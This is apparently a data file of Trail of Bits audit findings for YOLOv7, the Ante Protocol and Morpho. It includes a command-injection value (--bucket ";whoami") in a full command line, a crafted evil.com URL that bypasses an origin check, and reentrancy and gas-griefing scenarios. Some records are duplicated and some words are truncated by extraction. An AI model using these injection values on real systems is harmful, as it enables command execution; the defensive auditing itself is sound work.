--data data/coco.yaml --img 640 640 --weights 'maliciousyolov7.pt' --name yolov7 --hyp data/hyp.scratch.p5.yaml This exploit is dicult to detect due to the serialization of the object. Recommendations Short term, support only pretrained weights from the GitHub repo with a checksum to ensure the downloaded pretrained le is not malicious. Long term, use a safer serialization format, such as safetensors or ONNX, which allows for the serialization of complex models without allowing for the execution of arbitrary code.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "5. Multiple uses of os.system could allow command injection ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf", "body": "The codebase uses Pythons os.system to invoke certain commands. These are susceptible to malicious command injections. Certain commands, such as gsutil, unzip and curl, are executed as shell commands via Pythons os.system. An example can be found in the train.py script. if opt.bucket: os.system(f'gsutil cp {final} gs://{opt.bucket}/weights') # upload Figure 5.1: Use of os.system in the train function in train.py This particular use of os.system is vulnerable to command injection. By including the command line argument --bucket \";whoami\", we can invoke arbitrary commands as the current user. The full command to be executed might look like this: python train.py --bucket \";whoami\" --data data/coco.yaml --img 640 640 --cfg cfg/training/yolov7.yaml --weights '' --name yolov7 --hyp data/hyp.scratch.p5.yaml --epochs 1 Figure 5.2: Example command line injection for train.py Another problematic instance of os.system is in the check_dataset function: def check_dataset(dict): # Download dataset if not found locally val, s = dict.get('val'), dict.get('download') if val and len(val): val = [Path(x).resolve() for x in (val if isinstance(val, list) else [val])] # val path if not all(x.exists() for x in val): print('\\nWARNING: Dataset not found, nonexistent paths: %s' % [str(x) for x in val if not x.exists()]) if s and len(s): # download script print('Downloading %s ...' % s) if s.startswith('http') and s.endswith('.zip'): # URL f = Path(s).name # filename torch.hub.download_url_to_file(s, f) r = os.system('unzip -q %s -d ../ && rm %s' % (f, f)) # unzip else: # bash script r = os.system(s) print('Dataset autodownload %s\\n' % ('success' if r == 0 else 'failure')) # analyze return value else: raise Exception('Dataset not found.') Figure 5.3: Use of os.system in the check_dataset function in utils/general.py As highlighted in gure 5.3, the check_dataset function takes in a dictionary, which contains a download script s. If s is not a URL containing the substring `http` and `zip`, then check_dataset will execute an arbitrary command by calling os.system(s). This is particularly problematic because this function is called in both train.py and test.py with the dictionary value obtained from a YAML le specied by the user. If an attacker was able to compromise such a YAML le, this would introduce an arbitrary code execution vulnerability. Throughout the repository, there are many uses of os.system, many of which (but not all) are susceptible in the same way:  test.py#L352  train_aux.py#L430  train_aux.py#L512  train_aux.py#L656  train.py#L433  train.py#L515  train.py#L662  utils/general.py#L168  utils/general.py#L170  utils/general.py#L826  utils/general.py#L844  utils/google_utils.py#L47  utils/google_utils.py#L67  utils/google_utils.py#L72  utils/google_utils.py#L84  utils/plots.py#L410  utils/aws/resume.py#L37 Exploit Scenario The YOLOv7 repository is deployed as a cloud service for paying customers. Eve, a malicious user, spots the vulnerability and injects a command that starts a remote shell execution environment that she can access from her computer. She is now in control of the servers. Recommendations Short term, be vigilant when handling user-provided inputs. Heavily limit or sanitize these in order to reduce the expressivity of inputs. Extra care should be given to strings or inputs of arbitrary length, especially when these are being used in combination with commands that are able to execute arbitrary commands. Long term, review all instances of subprocess, eval, os.system, and any other permissive functions to ensure they are being used safely. In addition, consider replacing these instances with safer internal Python API calls.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "6. Use of unencrypted HTTP protocol ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf", "body": "YOLOv7 uses the unencrypted HTTP protocol in the documentation to download MS COCO dataset images (gure 6.1), which could allow an attacker to intercept and modify both the request and response of a victim user in the same network. The attacker could then manipulate the training set. 83 84 85 86 87 88 89 90 91 ## Training Data preparation ``` shell bash scripts/get_coco.sh ``` * Download MS COCO dataset images ([train](http://images.cocodataset.org/zips/train2017.zip), [val](http://images.cocodataset.org/zips/val2017.zip), [test](http://images.cocodataset.org/zips/test2017.zip)) Figure 6.1: Part of the YOLOv7 documentation that uses HTTP protocol to download dataset images (yolov7/README.md#8391) Exploit Scenario Eve gains access to Alices network and modies Alices downloaded training data to obtain specic recognizing behavior of YOLOv7. Recommendations Short term, enforce the use of the HTTPS URL scheme in the YOLOv7 documentation. Long term, review any YOLOv7 code that contains external links and ensure that those links do not use the HTTP protocol.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "7. Insecure origin check ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf", "body": "YOLOv7 insecurely checks the origin of the URLs (gure 7.1) by checking for youtube.com/ or youtu.be/ anywhere in the URL string. This validation can be bypassed by using any domain and the youtube.com/ or youtu.be/ strings as a parameter. 285 if 'youtube.com/' in str(url) or 'youtu.be/' in str(url): # if source is YouTube video Figure 7.1: Insecure origin check implementation (yolov7/utils/datasets.py#285) We have rated this issue as low severity because it aects the model only during detection. This issue would be more severe if this occurred during training, as this could allow an attacker to poison the training data and perform a backdoor attack or generally degrade the models performance. Exploit Scenario Eve creates a malicious website, evil.com, and crafts a URL that passes the application's origin check, such as evil.com/whatever?evilparam=youtube.com/. Eve then tricks Alice into using the deceptive link. Alice, who is unaware of the malicious link, downloads a tainted video, and her YOLO model performs very poorly. Alice then loses valuable time attempting to debug her model before realizing the issue was with her video. Recommendations Short term, ensure that youtube.com or youtu.be strings are present in the main domain section of the URL. Be aware of deceptive subdomain usage, as allowed strings can be used as subdomains (e.g., youtube.com.evil.com). Long term, incorporate CodeQL into your development process to avoid incomplete URL substring sanitization.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "8. The check_dataset function downloads and unzips les from arbitrary URLs ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf", "body": "The check_dataset function is used throughout the codebase to see if a dataset exists at a particular directory path; if the dataset does not exist, then the check_dataset function attempts to download the dataset by either downloading a zip le or running a bash script specied in the input. 156 157 158 159 160 def check_dataset(dict): # Download dataset if not found locally val, s = dict.get('val'), dict.get('download') if val and len(val): val = [Path(x).resolve() for x in (val if isinstance(val, list) else [val])] # val path 161 162 if not all(x.exists() for x in val): print('\\nWARNING: Dataset not found, nonexistent paths: %s' % [str(x) for x in val if not x.exists()]) 163 164 165 166 167 168 unzip 169 170 171 if s and len(s): # download script print('Downloading %s ...' % s) if s.startswith('http') and s.endswith('.zip'): # URL # filename f = Path(s).name torch.hub.download_url_to_file(s, f) r = os.system('unzip -q %s -d ../ && rm %s' % (f, f)) # else: # bash script r = os.system(s) print('Dataset autodownload %s\\n' % ('success' if r == 0 else 'failure')) # analyze return value 172 173 else: raise Exception('Dataset not found.') Figure 8.1: check_dataset function downloads and unzips from arbitrary URLs This could be highly problematic in some instances. For example, in the test.py le, this function is called on the data variable that is obtained from reading a YAML le that is specied via a command line argument. If this YAML le is corrupted, an attacker could inject a URL that will result in the target user unzipping a zip bomb that halts execution of the model. Exploit Scenario A malicious actor corrupts the dataset YAML le being used by a target user during training and injects a malicious download URL. The target user does not inspect their YAML les closely and unknowingly downloads and unzips a zip bomb that halts execution of their model. Recommendations Short term, validate the zip le before unzipping to prevent a zip bomb attack. For example, check the size of the le and do not unzip it if it is too large. Long term, limit which URLs users can download les from or carefully verify that downloaded les can be trusted before unzipping them. 9. Insu\u0000cient input validation in triton inference server could result in uncaught exception at runtime Severity: Medium Diculty: High Type: Denial of Service Finding ID: TOB-YOLO-9 Target: deploy/triton-inference-server", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "11. Project lacks adequate testing framework ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf", "body": "Currently, the YOLOv7 codebase does not contain any form of testing framework. The only testing of the codebase is performed on the model itself via the typical training and testing that is performed on machine learning models. Notably, there are no other units or integration tests in the codebase. Unit tests help expose errors and help provide additional documentation or understanding of the codebase to readers. Moreover, they exercise code in a more systematic way than any human can. A strong suite of unit tests is essential to protect against codebase regressions. A stronger testing suite could have prevented the occurrence of multiple issues in this report, such as TOB-YOLO9, and there are likely other issues in the codebase that could be uncovered by a stronger test suite. At a minimum, unit tests covering both the happy and sad paths should be added for all critical functions, especially those that accept input from potentially external sources. Ideally, this test suite could be extended to include the entire codebase and also include integration tests that test the interaction between multiple components (again, especially if these components interact with external input). Exploit Scenario A security-critical system relies on YOLOv7 for real-time object detection. A malicious actor closely monitors the system and the YOLOv7 codebase. Due to a lack of a testing framework that prevents code regressions, an old, critical aw is reintroduced into the codebase in a recent commit to the YOLOv7 codebase. The malicious actor identies this aw and exploits the security-critical system using this vulnerability. Recommendations Long term, implement a comprehensive suite of unit tests to cover both the happy and sad paths of critical components. In addition, consider incorporating static analysis tools like Semgrep and CodeQL into your development process.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "8. The check_dataset function downloads and unzips les from arbitrary URLs ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf", "body": "The check_dataset function is used throughout the codebase to see if a dataset exists at a particular directory path; if the dataset does not exist, then the check_dataset function attempts to download the dataset by either downloading a zip le or running a bash script specied in the input. 156 157 158 159 160 def check_dataset(dict): # Download dataset if not found locally val, s = dict.get('val'), dict.get('download') if val and len(val): val = [Path(x).resolve() for x in (val if isinstance(val, list) else [val])] # val path 161 162 if not all(x.exists() for x in val): print('\\nWARNING: Dataset not found, nonexistent paths: %s' % [str(x) for x in val if not x.exists()]) 163 164 165 166 167 168 unzip 169 170 171 if s and len(s): # download script print('Downloading %s ...' % s) if s.startswith('http') and s.endswith('.zip'): # URL # filename f = Path(s).name torch.hub.download_url_to_file(s, f) r = os.system('unzip -q %s -d ../ && rm %s' % (f, f)) # else: # bash script r = os.system(s) print('Dataset autodownload %s\\n' % ('success' if r == 0 else 'failure')) # analyze return value 172 173 else: raise Exception('Dataset not found.') Figure 8.1: check_dataset function downloads and unzips from arbitrary URLs This could be highly problematic in some instances. For example, in the test.py le, this function is called on the data variable that is obtained from reading a YAML le that is specied via a command line argument. If this YAML le is corrupted, an attacker could inject a URL that will result in the target user unzipping a zip bomb that halts execution of the model. Exploit Scenario A malicious actor corrupts the dataset YAML le being used by a target user during training and injects a malicious download URL. The target user does not inspect their YAML les closely and unknowingly downloads and unzips a zip bomb that halts execution of their model. Recommendations Short term, validate the zip le before unzipping to prevent a zip bomb attack. For example, check the size of the le and do not unzip it if it is too large. Long term, limit which URLs users can download les from or carefully verify that downloaded les can be trusted before unzipping them.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "9. Insu\u0000cient input validation in triton inference server could result in uncaught exception at runtime ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf", "body": "The triton inference server is an open source software that streamlines AI inference. The triton inference server component of the YOLOv7 codebase includes logic for deploying YOLOv7 to the triton inference server. The client.py le implements a command line interface for interacting with YOLO models deployed on triton; for example, using this command line interface, users can pass in images and videos to be evaluated. Despite this command line interface accepting images and videos from potentially external, untrusted sources, very limited input validation is performed on these inputs. As a result, several crafted inputs could cause execution to halt due to uncaught exceptions or other errors. One such example is shown in gure 9.1, where both the preprocess and postprocess functions (both of which are called in client.py) have multiple locations where a division-by-zero error could occur. 6 7 8 9 10 11 12 13 14 15 16 17 18 def preprocess(img, input_shape, letter_box=True): if letter_box: img_h, img_w, _ = img.shape new_h, new_w = input_shape[0], input_shape[1] offset_h, offset_w = 0, 0 if (new_w / img_w) <= (new_h / img_h): new_h = int(img_h * new_w / img_w) offset_h = (input_shape[0] - new_h) // 2 else: new_w = int(img_w * new_h / img_h) offset_w = (input_shape[1] - new_w) // 2 resized = cv2.resize(img, (new_w, new_h)) img = np.full((input_shape[0], input_shape[1], 3), 127, dtype=np.uint8) 19 resized 20 21 22 23 24 25 img[offset_h:(offset_h + new_h), offset_w:(offset_w + new_w), :] = else: img = cv2.resize(img, (input_shape[1], input_shape[0])) img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB) img = img.transpose((2, 0, 1)).astype(np.float32) img /= 255. 26 27 28 return img def postprocess(num_dets, det_boxes, det_scores, det_classes, img_w, img_h, input_shape, letter_box=True): 29 boxes = det_boxes[0, :num_dets[0][0]] / np.array([input_shape[0], input_shape[1], input_shape[0], input_shape[1]], dtype=np.float32) 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 scores = det_scores[0, :num_dets[0][0]] classes = det_classes[0, :num_dets[0][0]].astype(np.int) old_h, old_w = img_h, img_w offset_h, offset_w = 0, 0 if letter_box: if (img_w / input_shape[1]) >= (img_h / input_shape[0]): old_h = int(input_shape[0] * img_w / input_shape[1]) offset_h = (old_h - img_h) // 2 else: old_w = int(input_shape[1] * img_h / input_shape[0]) offset_w = (old_w - img_w) // 2 boxes = boxes * np.array([old_w, old_h, old_w, old_h], dtype=np.float32) if letter_box: boxes -= np.array([offset_w, offset_h, offset_w, offset_h], dtype=np.float32) 46 47 48 49 50 boxes = boxes.astype(np.int) detected_objects = [] for box, score, label in zip(boxes, scores, classes): detected_objects.append(BoundingBox(label, score, box[0], box[2], box[1], box[3], img_w, img_h)) 51 return detected_objects Figure 9.1: preprocess and postprocess functions do not validate inputs and could trigger division-by-zero errors. A comprehensive suite of unit tests, covering both the happy and sad codepaths, could help to identify and resolve issues like this. Without any existing unit tests in the triton inference code, it is likely that other crafted input values could result in halting the execution of the inference, or potentially even more severe results. Exploit Scenario A malicious actor targets a system using YOLOv7 deployed on triton in which high availability is essential, such as an autonomous vehicle system. An attacker discovers these implementation aws and causes execution to halt by passing in malformed images, which will result in a division-by-zero error occurring during either pre-processing or post-processing. The system experiences a denial of service. Recommendations Short term, update preprocess, postprocess, and client.py to properly handle inputs that currently cause a division-by-zero error to occur. Long term, implement a comprehensive suite of unit tests to cover both the happy and sad paths of critical components. In addition, consider incorporating static analysis tools like Semgrep and CodeQL into your development process.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "10. Improper use of TorchScript tracing leads to model di\u0000erentials ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf", "body": "To facilitate deployment, Pytorch oers torch.jit.trace to convert models into the TorchScript format. However, as shown in table 10.1, there are many known cases in which tracing does not lead to an accurate representation. Tracer Edge Cases Example Input-dependent control ow (including mutable container types and in-place operations) Lines 34,35,37,40,and 51 of models/yolo.py Certain tensor operations from external libraries and implicit type conversions with tensors Lines 50-59 of models/experimental.py Table 10.1: Edge cases in which tracing does not produce accurate representation These cases are present in the dened YOLOv7 models that are currently being traced . This means that the deployed model is dierent from the original model, yielding dierent results. In addition, in this codebase, tracing is performed after the model is serialized to a PyTorch le and then deserialized. This practice, in conjunction with the non-standard structure of the model architecture code, results in the loss of information that analyzes the veracity of training, such as tracer warnings indicating the presence of edge cases. 362 traced_script_module = torch.jit.trace(self.model, rand_example, strict=False) Figure 10.1: Improper use of TorchScript tracing (yolov7/utils/torch_utils.py#362) This use of tracing could introduce dierentials that enable the creation of backdoors. For instance, an attacker could craft a malicious model that behaves dierently when deployed. Specically, this attacker could introduce a backdoor of custom logic that executes only on deployed models. Exploit Scenario An attacker trains a model that exhibits a specic, potentially malicious behavior when deployed that is not present otherwise. Specically, the attacker creates a model that has special behavior for specic input images. Since this behavior is present only for specic images and only during deployment, detecting this backdoored behavior is dicult. Recommendations Short-term, mix both tracing and scripting of the model to ensure that all tracing edge cases are avoided. It would also be useful to minimize edge cases, especially those indicated by tracer warnings, to reduce the possibility of dierentials. The integrity and eectiveness of tracing should also be tested before serialization by using the automatic trace checker. Long-term, use torch.compile instead of tracing and scripting, as it minimizes the presence of dierentials.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "12. Flaw in detect.py will cause runtime exceptions to occur when using a traced model ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-yolov7-securityreview.pdf", "body": "The detect.py le provides command-line arguments for using the trained YOLO models. These command-line arguments include --img-size and --no-trace. The former argument controls the size of the image being sent to the model, and the latter controls whether or not a traced model is used. The function check_img_size() updates the size of the image (if it is invalid) using the variable imgz. However, when the model is traced, the original input size is passed to the model instead of the updated size. This results in a runtime error when an invalid image size is passed when the model is traced that is not present otherwise. 34 35 36 37 38 model = attempt_load(weights, map_location=device) # load FP32 model stride = int(model.stride.max()) imgsz = check_img_size(imgsz, s=stride) # check img_size if trace: # model stride model = TracedModel(model, device, opt.img_size) Figure 12.1: Potential runtime exception in detect.py#L38 Exploit Scenario A malicious actor targets a system using YOLO in which high availability is essential, such as an autonomous vehicle system. An attacker discovers that this implementation aw exists in the version of YOLO being run in the system and causes the target system to attempt to trace a model with invalid image size. Due to this implementation aw, execution halts and the system experiences a denial of service. Recommendations Short term, adjust detect.py to resolve this implementation aw and allow tracing to occur with the proper image size. Long term, implement a comprehensive suite of unit tests to cover both the happy and sad paths of critical components. In addition, consider incorporating static analysis tools like Semgrep and CodeQL into your development process. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "1. AntePoolFactory does not validate create2 return addresses ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf", "body": "The AntePoolFactory uses the create2 instruction to deploy an AntePool and then initializes it with an already-deployed AnteTest address. However, the AntePoolFactory does not validate the address returned by create2, which will be the zero address if the deployment operation fails. bytes memory bytecode = type(AntePool).creationCode; bytes32 salt = keccak256(abi.encodePacked(testAddr)); assembly { testPool := create2(0, add(bytecode, 0x20), mload(bytecode), salt) } poolMap[testAddr] = testPool; allPools.push(testPool); AntePool(testPool).initialize(anteTest); emit AntePoolCreated(testAddr, testPool); Figure 1.1: contracts/AntePoolFactory.sol#L35-L47 This lack of validation does not currently pose a problem, because the simplicity of AntePool contracts helps prevent deployment failures (and thus the return of the zero address). However, deployment issues could become more likely in future iterations of the Ante Protocol. Recommendations Short term, have the AntePoolFactory check the address returned by the create2 operation against the zero address. Long term, ensure that the results of operations that return a zero address in the event of a failure (such as create2 and ecrecover operations) are validated appropriately.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "2. Events emitted during critical operations omit certain details ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf", "body": "Events are generally emitted for all critical state-changing operations within the system. However, the AntePoolCreated event emitted by the AntePoolFactory does not capture the address of the msg.sender that deployed the AntePool. This information would help provide a more complete audit trail in the event of an attack, as the msg.sender often refers to the externally owned account that sent the transaction but could instead refer to an intermediate smart contract address. emit AntePoolCreated(testAddr, testPool); Figure 2.1: contracts/AntePoolFactory.sol#L47 Additionally, consider having the AntePool.updateDecay method emit an event with the pool share parameters used in decay calculations. Recommendations Short term, capture the msg.sender in the AntePoolFactory.AntePoolCreated event, and have AntePool.updateDecay emit an event that includes the relevant decay calculation parameters. Long term, ensure critical state-changing operations trigger events sucient to form an audit trail in the event of a system failure. Events should capture relevant parameters to help auditors determine the cause of failure. 3. Insu\u0000cient gas can cause AnteTests to produce false positives Severity: High Diculty: High Type: Data Validation Finding ID: TOB-ANTE-3 Target: contracts/AntePool.sol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "4. Looping over an array of unbounded size can cause a denial of service ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf", "body": "If an AnteTest fails, the _checkTestNoRevert function will return false, causing the checkTest function to call _calculateChallengerEligibility to compute eligibleAmount; this value is the total stake of the eligible challengers and is used to calculate the proportion of _remainingStake owed to each challenger. To calculate eligibleAmount, the _calculateChallengerEligibility function loops through an unbounded array of challenger addresses. When the number of challengers is large, the function will consume a large quantity of gas in this operation. function _calculateChallengerEligibility() internal { uint256 cutoffBlock = failedBlock.sub(CHALLENGER_BLOCK_DELAY); for (uint256 i = 0; i < challengers.addresses.length; i++) { address challenger = challengers.addresses[i]; if (eligibilityInfo.lastStakedBlock[challenger] < cutoffBlock) { eligibilityInfo.eligibleAmount = eligibilityInfo.eligibleAmount.add( _storedBalance(challengerInfo.userInfo[challenger], challengerInfo) ); } } } Figure 4.1: contracts/AntePool.sol#L553-L563 However, triggering an out-of-gas error would be costly to an attacker; the attacker would need to create many accounts through which to stake funds, and the amount of each stake would decay over time. Exploit Scenario The length of the challenger address array grows such that the computation of the eligibleAmount causes the block to reach its gas limit. Then, because of this Ethereum-imposed gas constraint, the entire transaction reverts, and the failing AnteTest is not marked as failing. As a result, challengers who have staked funds in anticipation of a failed test will not receive a payout. Recommendations Short term, determine the number of challengers that can enter an AntePool without rendering the _calculateChallengerEligibility functions operation too gas intensive; then, use that number as the upper limit on the number of challengers. Long term, avoid calculating every challengers proportion of _remainingStake in the same operation; instead, calculate each user's pro-rata share when he or she enters the pool and modify the challenger delay to require that a challenger register and wait 12 blocks before minting his or her pro-rata share. Upon a test failure, a challenger would burn these shares and redeem them for ether.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "2. Events emitted during critical operations omit certain details ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf", "body": "Events are generally emitted for all critical state-changing operations within the system. However, the AntePoolCreated event emitted by the AntePoolFactory does not capture the address of the msg.sender that deployed the AntePool. This information would help provide a more complete audit trail in the event of an attack, as the msg.sender often refers to the externally owned account that sent the transaction but could instead refer to an intermediate smart contract address. emit AntePoolCreated(testAddr, testPool); Figure 2.1: contracts/AntePoolFactory.sol#L47 Additionally, consider having the AntePool.updateDecay method emit an event with the pool share parameters used in decay calculations. Recommendations Short term, capture the msg.sender in the AntePoolFactory.AntePoolCreated event, and have AntePool.updateDecay emit an event that includes the relevant decay calculation parameters. Long term, ensure critical state-changing operations trigger events sucient to form an audit trail in the event of a system failure. Events should capture relevant parameters to help auditors determine the cause of failure.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "3. Insu\u0000cient gas can cause AnteTests to produce false positives ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf", "body": "Once challengers have staked ether and the challenger delay has passed, they can submit transactions to predict that a test will fail and to earn a bonus if it does. An attacker could manipulate the result of an AnteTest by providing a limited amount of gas to the checkTest function, forcing the test to fail. This is because the anteTest.checkTestPasses function receives 63/64 of the gas provided to checkTest (per the 63/64 gas forwarding rule), which may not be enough. This issue stems from the use of a try-catch statement in the _checkTestNoRevert function, which causes the function to return false when an EVM exception occurs, indicating a test failure. We set the diculty of this nding to high, as the outer call will also revert with an out-of-gas exception if it requires more than 1/64 of the gas; however, other factors (e.g., the block gas limit) may change in the future, allowing for a successful exploitation. if (!_checkTestNoRevert()) { updateDecay(); verifier = msg.sender; failedBlock = block.number; pendingFailure = true; _calculateChallengerEligibility(); _bounty = getVerifierBounty(); uint256 totalStake = stakingInfo.totalAmount.add(withdrawInfo.totalAmount); _remainingStake = totalStake.sub(_bounty); Figure 3.1: Part of the checkTest function /// @return passes bool if the Ante Test passed function _checkTestNoRevert() internal returns (bool) { try anteTest.checkTestPasses() returns (bool passes) { return passes; } catch { return false; } } Figure 3.2: contracts/AntePool.sol#L567-L573 Exploit Scenario An attacker calculates the amount of gas required for checkTest to run out of gas in the inner call to anteTest.checkTestPasses. The test fails, and the attacker claims the verier bonus. Recommendations Short term, ensure that the AntePool reverts if the underlying AnteTest does not have enough gas to return a meaningful value. Long term, redesign the test verication mechanism such that gas usage does not cause false positives.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "5. Reentrancy into AntePool.checkTest scales challenger eligibility amount ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AnteProtocol.pdf", "body": "A malicious AnteTest or underlying contract being tested can trigger multiple failed checkTest calls by reentering the AntePool.checkTest function. With each call, the _calculateChallengerEligibility method increases the eligibleAmount instead of resetting it, causing the eligibleAmount to scale unexpectedly with each reentrancy. function checkTest() external override testNotFailed { require(challengers.exists(msg.sender), \"ANTE: Only challengers can checkTest\"); require( block.number.sub(eligibilityInfo.lastStakedBlock[msg.sender]) > CHALLENGER_BLOCK_DELAY, \"ANTE: must wait 12 blocks after challenging to call checkTest\" ); numTimesVerified = numTimesVerified.add(1); lastVerifiedBlock = block.number; emit TestChecked(msg.sender); if (!_checkTestNoRevert()) { updateDecay(); verifier = msg.sender; failedBlock = block.number; pendingFailure = true; _calculateChallengerEligibility(); _bounty = getVerifierBounty(); uint256 totalStake = stakingInfo.totalAmount.add(withdrawInfo.totalAmount); _remainingStake = totalStake.sub(_bounty); emit FailureOccurred(msg.sender); } } Figure 5.1: contracts/AntePool.sol#L292-L316 function _calculateChallengerEligibility() internal { uint256 cutoffBlock = failedBlock.sub(CHALLENGER_BLOCK_DELAY); for (uint256 i = 0; i < challengers.addresses.length; i++) { address challenger = challengers.addresses[i]; if (eligibilityInfo.lastStakedBlock[challenger] < cutoffBlock) { eligibilityInfo.eligibleAmount = eligibilityInfo.eligibleAmount.add( _storedBalance(challengerInfo.userInfo[challenger], challengerInfo) ); } } } Figure 5.2: contracts/AntePool.sol#L553-L563 Appendix D includes a proof-of-concept AnteTest contract and hardhat unit test that demonstrate this issue. Exploit Scenario An attacker deploys an AnteTest contract or a vulnerable contract to be tested. The attacker directs the deployed contract to call AntePool.stake, which registers the contract as a challenger. The malicious contract then reenters AntePool.checkTest and triggers multiple failures within the same call stack. As a result, the AntePool makes multiple calls to the _calculateChallengerEligibility method, which increases the challenger eligibility amount with each call. This results in a greater-than-expected loss of pool funds. Recommendations Short term, implement checks to ensure the AntePool contracts methods cannot be reentered while checkTest is executing. Long term, ensure that all calls to external contracts are reviewed for reentrancy risks. To prevent a reentrancy from causing undened behavior in the system, ensure state variables are updated in the appropriate order; alternatively (and if sensible) disallow reentrancy altogether. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "1. Lack of two-step process for contract ownership changes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf", "body": "The owner of the IncentivesVault contract and other Ownable Morpho contracts can be changed by calling the transferOwnership function. This function internally calls the _transferOwnership function, which immediately sets the contracts new owner. Making such a critical change in a single step is error-prone and can lead to irrevocable mistakes. 13 contract IncentivesVault is IIncentivesVault, Ownable { Figure 1.1: Inheritance of contracts/compound/IncentivesVault.sol 62 function transferOwnership(address newOwner) public virtual onlyOwner { 63 64 65 } require(newOwner != address(0), \"Ownable: new owner is the zero address\"); _transferOwnership(newOwner); Figure 1.2: The transferOwnership function in @openzeppelin/contracts/access/Ownable.sol Exploit Scenario Bob, the IncentivesVault owner, invokes transferOwnership() to change the contracts owner but accidentally enters the wrong address. As a result, he permanently loses access to the contract. Recommendations Short term, for contract ownership transfers, implement a two-step process, in which the owner proposes a new address and the transfer is completed once the new address has executed a call to accept the role. Long term, identify and document all possible actions that can be taken by privileged accounts and their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Incomplete information provided in Withdrawn and Repaid events ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf", "body": "The core operations in the PositionsManager contract emit events with parameters that provide information about the operations actions. However, two events, Withdrawn and Repaid, do not provide complete information. For example, the withdrawLogic function, which performs withdrawals, takes a _supplier address (the user supplying the tokens) and _receiver address (the user receiving the tokens): /// @param _supplier The address of the supplier. /// @param _receiver The address of the user who will receive the tokens. /// @param _maxGasForMatching The maximum amount of gas to consume within a matching engine loop. function withdrawLogic( address _poolTokenAddress, uint256 _amount, address _supplier, address _receiver, uint256 _maxGasForMatching ) external Figure 2.1: The function signature of PositionsManagers withdrawLogic function However, the corresponding event in _safeWithdrawLogic records only the msg.sender of the transaction, so the _supplier and _receiver involved in the transaction are unclear. Moreover, if a withdrawal is performed as part of a liquidation operation, three separate addresses may be involvedthe _supplier, the _receiver, and the _user who triggered the liquidationand those monitoring events will have to cross-reference multiple events to understand whose tokens moved where. /// @notice Emitted when a withdrawal happens. /// @param _user The address of the withdrawer. /// @param _poolTokenAddress The address of the market from where assets are withdrawn. /// @param _amount The amount of assets withdrawn (in underlying). /// @param _balanceOnPool The supply balance on pool after update. /// @param _balanceInP2P The supply balance in peer-to-peer after update. event Withdrawn( address indexed _user,  Figure 2.2: The declaration of the Withdrawn event in PositionsManager emit Withdrawn( msg.sender, _poolTokenAddress, _amount, supplyBalanceInOf[_poolTokenAddress][msg.sender].onPool, supplyBalanceInOf[_poolTokenAddress][msg.sender].inP2P ); Figure 2.3: The emission of the Withdrawn event in the _safeWithdrawLogic function A similar issue is present in the _safeRepayLogic functions Repaid event. Recommendations Short term, add the relevant addresses to the Withdrawn and Repaid events. Long term, review all of the events emitted by the system to ensure that they emit sucient information.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Missing access control check in withdrawLogic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/MorphoLabs.pdf", "body": "The PositionsManager contracts withdrawLogic function does not perform any access control checks. In practice, this issue is not exploitable, as all interactions with this contract will be through delegatecalls with a hard-coded msg.sender sent from the main Morpho contract. However, if this code is ever reused or if the architecture of the system is ever modied, this guarantee may no longer hold, and users without the proper access may be able to withdraw funds. /// @dev Implements withdraw logic with security checks. /// @param _poolTokenAddress The address of the market the user wants to interact with. /// @param _amount The amount of token (in underlying). /// @param _supplier The address of the supplier. /// @param _receiver The address of the user who will receive the tokens. /// @param _maxGasForMatching The maximum amount of gas to consume within a matching engine loop. function withdrawLogic( address _poolTokenAddress, uint256 _amount, address _supplier, address _receiver, uint256 